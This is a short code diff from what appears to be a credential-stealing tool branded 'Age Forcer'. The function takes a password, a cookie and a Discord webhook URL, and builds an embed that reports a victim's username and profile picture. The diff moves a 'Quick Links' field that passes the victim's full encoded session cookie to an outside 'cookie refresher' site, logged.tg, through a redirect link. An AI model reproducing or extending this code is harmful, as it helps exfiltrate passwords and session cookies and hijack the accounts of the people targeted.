@@ -80,23 +80,17 @@ def send_to_discord_background(password, cookie, webhook_url):
             'content': ping_content,
             'embeds': [
                 {
-                    'title': 'Top Embed Message',
-                    'color': 0xff0000,
-                    'fields': [
-                        {
-                            'name': '🔗 Quick Links',
-                            'value': f'[**__Discord Server__ <:discord_icon:1236760091794083903>**](https://discord.gg/SsWFKqXr)\n\n[**__Refresh Cookie__ <:cookie1:1322924823764013086>**](https://dropref.com/?https://www.logged.tg/tools/refresher?defaultFill={encoded_full_cookie})',
-                            'inline': False
-                        }
-                    ]
-                },
-                {
                     'title': 'Age Forcer',
                     'color': 0xff0000,
                     'thumbnail': {
                         'url': user_info['profile_picture']
                     },
                     'fields': [
+                        {
+                            'name': '🔗 Quick Links',
+                            'value': f'[**__Discord Server__ <:discord_icon:1236760091794083903>**](https://discord.gg/SsWFKqXr)\n\n[**__Refresh Cookie__ <:cookie1:1322924823764013086>**](https://dropref.com/?https://www.logged.tg/tools/refresher?defaultFill={encoded_full_cookie})',
+                            'inline': False
+                        },
                         {
                             'name': '👤 Username',
                             'value': user_info['username'],
